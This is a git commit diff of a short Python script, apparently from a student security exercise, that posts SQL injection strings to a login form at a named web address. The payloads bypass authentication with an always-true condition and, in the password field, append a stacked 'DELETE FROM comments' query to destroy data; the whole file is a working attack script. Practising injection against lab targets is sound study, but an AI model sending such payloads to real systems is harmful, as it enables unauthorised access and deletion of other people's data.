c103e5987756d856bc6c384acd4cb9c0e200e98d
xsucho08 <xsucho08@vutbr.cz>
2020-11-03 16:39:45 +0100

    SQL second attempt

--- SQL Injection/sqlInjexction.py
+++ SQL Injection/sqlInjexction.py
@@ -1,14 +1,16 @@
 import mysql.connector
 
 print('ahoj')
-jmeno = ' anything\' OR \'x\'=\'x; DELETE FROM comments WHERE id = \'1\'; -- '
+usernameField = 'anything\' OR \'x\'=\'x'
+passwordField = 'anything\' OR \'x\'=\'x\'; DELETE FROM comments WHERE id = \'1\'; --'
 
 from twill.commands import *
-print(jmeno)
+print(usernameField)
+print(passwordField)
 import requests
 url = 'http://apache1.willilazarov.cz/'
-values = {'username': jmeno ,
-          'password': jmeno }
+values = {'username': usernameField ,
+          'password': passwordField }
 
 r = requests.post(url, data=values)
 print(r.content)
